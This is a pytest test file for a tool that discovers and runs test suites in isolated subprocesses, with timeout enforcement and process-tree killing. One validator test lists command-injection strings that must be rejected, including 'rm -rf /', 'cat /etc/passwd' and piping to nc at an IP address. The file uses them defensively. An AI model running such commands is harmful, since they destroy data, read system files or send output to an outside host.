"""
Unit tests for Pytest Discovery, Safe Isolated Execution, and Timeout Protection.
"""

import os
import subprocess
import sys
from pathlib import Path

import pytest
from sqlalchemy.orm import Session

from conftest.tests.discovery import validate_test_node_id, PytestDiscovery
from conftest.tests import executor as executor_module
from conftest.tests.executor import SafeTestExecutor
from conftest.tests.runner_service import TestRunnerService
from conftest.db import crud
from datetime import datetime


def test_node_id_validation_security():
    """Verify node ID sanitizer accepts valid test paths and rejects command injection attempts."""
    # Valid pytest node IDs
    assert validate_test_node_id("tests/test_auth.py::test_login") is True
    assert validate_test_node_id("tests/sub/test_db.py::TestClass::test_method") is True
    assert validate_test_node_id("tests/test_params.py::test_calc[param1-2]") is True

    # Malicious injection payloads
    assert validate_test_node_id("tests/test_auth.py; rm -rf /") is False
    assert validate_test_node_id("tests/test_auth.py && cat /etc/passwd") is False
    assert validate_test_node_id("tests/test_auth.py | nc 1.2.3.4 80") is False
    assert validate_test_node_id("`whoami`") is False
    assert validate_test_node_id("") is False


def test_pytest_discovery_on_sample_suite():
    """Verify test discovery on tests/sample_suite."""
    sample_root = Path("./tests/sample_suite")
    discovery = PytestDiscovery(str(sample_root))
    tests = discovery.discover_via_pytest(test_dir="tests")

    assert len(tests) >= 5
    test_ids = [t["test_id"] for t in tests]
    assert any("test_password_hashing" in t for t in test_ids)
    assert any("test_db_set_and_get" in t for t in test_ids)


def test_safe_test_executor_selective_run():
    """Verify executing a single selected test case via SafeTestExecutor."""
    sample_root = Path(".")
    executor = SafeTestExecutor(str(sample_root))

    target = "tests/sample_suite/tests/test_auth.py::test_password_hashing"
    result = executor.run_tests(test_node_ids=[target], timeout=30)

    assert result.exit_code == 0
    assert result.total_count >= 1
    assert result.passed_count >= 1
    assert result.failed_count == 0
    assert result.total_duration > 0


def test_runner_service_end_to_end(db_session: Session):
    """Verify end-to-end test execution, DB test_run persistence, and outcome calculation."""
    repo = crud.create_repository(
        db=db_session,
        full_name="sample/test-runner-app",
        url="https://github.com/sample/test-app",
        local_path="./tests/sample_suite",
    )
    commit = crud.create_commit(
        db=db_session,
        repository_id=repo.id,
        sha="e" * 40,
        timestamp=datetime.utcnow(),
    )

    service = TestRunnerService(repo_root=".")
    selected = ["tests/sample_suite/tests/test_auth.py::test_password_hashing"]

    metrics = service.execute_and_evaluate(
        db=db_session,
        commit_id=commit.id,
        repository_id=repo.id,
        selected_node_ids=selected,
        timeout=30,
    )

    assert metrics["exit_code"] == 0
    assert metrics["selected_count"] >= 1
    assert metrics["actual_failures"] == 0
    assert metrics["outcome_id"] is not None

    # Check persisted runs in DB
    runs = crud.get_test_runs_for_commit(db_session, commit.id)
    assert len(runs) >= 1
    assert runs[0].status == "PASSED"


# --------------------------------------------------------------------------
# Interpreter selection
#
# The executor is the single place pytest is invoked, so it is the single place
# that decides which environment a suite runs in. For mutation harvesting that
# decision is not a preference: a suite run under an interpreter that imports a
# released copy of the package cannot observe a mutation in the checkout, and
# labels every mutant harmless without raising anything.
# --------------------------------------------------------------------------

def test_executor_defaults_to_the_running_interpreter(tmp_path):
    assert SafeTestExecutor(str(tmp_path)).python_executable == sys.executable


def test_executor_uses_an_explicit_interpreter(tmp_path):
    executor = SafeTestExecutor(str(tmp_path), python_executable=sys.executable)

    assert executor.python_executable == str(Path(sys.executable).resolve())


def test_executor_refuses_a_missing_interpreter(tmp_path):
    """
    Fatal rather than a fallback.

    Falling back to sys.executable when the requested environment is absent
    would reintroduce precisely the failure the argument exists to prevent, and
    would do it silently at the point where hours of compute begin.
    """
    missing = tmp_path / "no_such_venv" / "Scripts" / "python.exe"

    with pytest.raises(FileNotFoundError, match="python_executable does not exist"):
        SafeTestExecutor(str(tmp_path), python_executable=str(missing))


class FakePopen:
    """
    Stand-in for a pytest subprocess.

    Records what the executor asked for, optionally writes to the handles it
    was given, and either exits or refuses to.
    """

    def __init__(self, cmd, **kwargs):
        self.cmd = cmd
        self.kwargs = kwargs
        self.pid = -1
        self.killed = False
        self.waits = []
        if self.stdout_text:
            kwargs["stdout"].write(self.stdout_text)
        if self.stderr_text:
            kwargs["stderr"].write(self.stderr_text)

    stdout_text = ""
    stderr_text = ""
    hangs = False
    returncode = 0

    def wait(self, timeout=None):
        self.waits.append(timeout)
        if self.hangs and not self.killed:
            raise subprocess.TimeoutExpired(self.cmd, timeout)
        return self.returncode

    def kill(self):
        self.killed = True


def _patch_popen(monkeypatch, factory, seen):
    def fake_popen(cmd, **kwargs):
        proc = factory(cmd, **kwargs)
        seen.append(proc)
        return proc

    monkeypatch.setattr(executor_module.subprocess, "Popen", fake_popen)


def test_executor_invokes_the_chosen_interpreter(tmp_path, monkeypatch):
    seen = []
    _patch_popen(monkeypatch, FakePopen, seen)

    executor = SafeTestExecutor(str(tmp_path), python_executable=sys.executable)
    executor.run_tests(test_dir="tests")

    assert seen[0].cmd[0] == str(Path(sys.executable).resolve())
    assert seen[0].cmd[1:3] == ["-m", "pytest"]


# --------------------------------------------------------------------------
# Capture and timeout enforcement
#
# subprocess.run(stdout=PIPE, timeout=...) is not a timeout. On TimeoutExpired
# CPython kills the direct child and then drains the pipe with no deadline, so
# one grandchild holding the inherited handle suspends the drain forever. This
# project paid 7h51m for that: a 180s suite timeout on mut_42bfc7db58b0
# returned after 28,270s, and the mutated checkout stayed live throughout --
# long enough for the suite under test to truncate one of its own fixtures.
# --------------------------------------------------------------------------

def test_executor_captures_to_files_never_to_pipes(tmp_path, monkeypatch):
    seen = []
    _patch_popen(monkeypatch, FakePopen, seen)

    SafeTestExecutor(str(tmp_path)).run_tests(test_dir="tests")

    kwargs = seen[0].kwargs
    for stream in ("stdout", "stderr"):
        assert kwargs[stream] is not subprocess.PIPE
        assert hasattr(kwargs[stream], "write"), f"{stream} must be a real file handle"
    assert kwargs["stdout"].name != kwargs["stderr"].name
    # A suite that reads stdin must get EOF rather than block on a terminal.
    assert kwargs["stdin"] is subprocess.DEVNULL


def test_executor_reads_the_captures_back_and_removes_them(tmp_path, monkeypatch):
    class Chatty(FakePopen):
        stdout_text = "collected 3 items"
        stderr_text = "a warning on stderr"

    seen = []
    _patch_popen(monkeypatch, Chatty, seen)

    result = SafeTestExecutor(str(tmp_path)).run_tests(test_dir="tests")

    assert "collected 3 items" in result.stdout
    assert "a warning on stderr" in result.stderr
    # The capture files are scratch space, not artefacts.
    for stream in ("stdout", "stderr"):
        assert not os.path.exists(seen[0].kwargs[stream].name)


def test_executor_reports_an_enforced_timeout_on_the_happy_path(tmp_path, monkeypatch):
    _patch_popen(monkeypatch, FakePopen, [])

    result = SafeTestExecutor(str(tmp_path)).run_tests(test_dir="tests")

    assert result.timed_out is False
    assert result.timeout_enforced is True


def test_executor_kills_the_tree_when_a_run_times_out(tmp_path, monkeypatch):
    class Hanging(FakePopen):
        hangs = True

    seen = []
    _patch_popen(monkeypatch, Hanging, seen)
    killed = []
    monkeypatch.setattr(
        executor_module.SafeTestExecutor,
        "_kill_process_tree",
        lambda self, proc: killed.append(proc) or True,
    )

    result = SafeTestExecutor(str(tmp_path)).run_tests(test_dir="tests", timeout=1)

    assert result.timed_out is True
    assert result.exit_code == 124
    assert killed == [seen[0]], "a timeout must reach the whole tree, not just the child"
    assert result.timeout_enforced is True
    assert "timed out after 1s" in result.stderr


def test_executor_admits_a_timeout_it_could_not_enforce(tmp_path, monkeypatch):
    """
    A surviving tree is reported, not hidden.

    The caller has to be able to tell "this mutant was slow" from "this mutant
    is still running while I measure the next one", because only the second
    invalidates every record that follows it.
    """
    class Hanging(FakePopen):
        hangs = True

    _patch_popen(monkeypatch, Hanging, [])
    monkeypatch.setattr(
        executor_module.SafeTestExecutor, "_kill_process_tree", lambda self, proc: False
    )

    result = SafeTestExecutor(str(tmp_path)).run_tests(test_dir="tests", timeout=1)

    assert result.timed_out is True
    assert result.timeout_enforced is False


def test_executor_flags_a_run_that_outlived_its_own_ceiling(tmp_path, monkeypatch):
    """
    The post-hoc check, which is what the 28,270s run would have tripped.

    Whatever the kill path believed, a wall clock longer than the timeout plus
    the kill grace is proof the ceiling did not hold.
    """
    class Clock:
        def __init__(self):
            self.reads = 0

        def time(self):
            self.reads += 1
            # First read is the start; every later read is well past the ceiling.
            if self.reads == 1:
                return 0.0
            return 11.0 + executor_module.BROKEN_TIMEOUT_SLACK_SECONDS

    _patch_popen(monkeypatch, FakePopen, [])
    monkeypatch.setattr(executor_module, "time", Clock())

    result = SafeTestExecutor(str(tmp_path)).run_tests(test_dir="tests", timeout=10)

    assert result.timed_out is False, "it exited on its own, just far too late"
    assert result.timeout_enforced is False
    assert result.total_duration > 10


# --------------------------------------------------------------------------
# The tree kill itself. Stubbed at the platform call: a test that ran a real
# taskkill /T /F on a fabricated pid could kill an unrelated live process.
# --------------------------------------------------------------------------

def _stub_platform_kill(monkeypatch):
    """Neutralise taskkill and killpg, returning the calls they would have made."""
    calls = {"taskkill": [], "killpg": []}
    monkeypatch.setattr(
        executor_module.subprocess, "run", lambda cmd, **kw: calls["taskkill"].append(cmd)
    )
    monkeypatch.setattr(
        executor_module.os, "killpg", lambda pgid, sig: calls["killpg"].append(pgid),
        raising=False,
    )
    monkeypatch.setattr(executor_module.os, "getpgid", lambda pid: pid, raising=False)
    return calls


def test_kill_process_tree_confirms_a_dead_tree(tmp_path, monkeypatch):
    calls = _stub_platform_kill(monkeypatch)
    proc = FakePopen(["pytest"], stdout=None, stderr=None)

    assert SafeTestExecutor(str(tmp_path))._kill_process_tree(proc) is True
    assert proc.killed is True
    reached = calls["taskkill"] if os.name == "nt" else calls["killpg"]
    assert reached, "the kill has to address the tree, not only the direct child"


def test_kill_process_tree_reports_a_survivor(tmp_path, monkeypatch):
    class Unkillable(FakePopen):
        hangs = True

        def kill(self):
            # Deliberately does not die: this is the grandchild-holds-the-tree case.
            pass

    _stub_platform_kill(monkeypatch)
    proc = Unkillable(["pytest"], stdout=None, stderr=None)

    assert SafeTestExecutor(str(tmp_path))._kill_process_tree(proc) is False
    assert proc.waits[-1] == executor_module.KILL_GRACE_SECONDS, "the wait must be bounded"


def test_result_dict_carries_whether_the_timeout_held():
    """The harness stamps records from to_dict, so the flag has to survive it."""
    broken = executor_module.PytestExecutionResult(
        exit_code=124, total_duration=28269.997, test_runs=[], timed_out=True,
        timeout_enforced=False,
    )

    assert broken.to_dict()["timeout_enforced"] is False
    assert broken.to_dict()["timed_out"] is True
    assert executor_module.PytestExecutionResult(0, 1.0, []).to_dict()["timeout_enforced"] is True
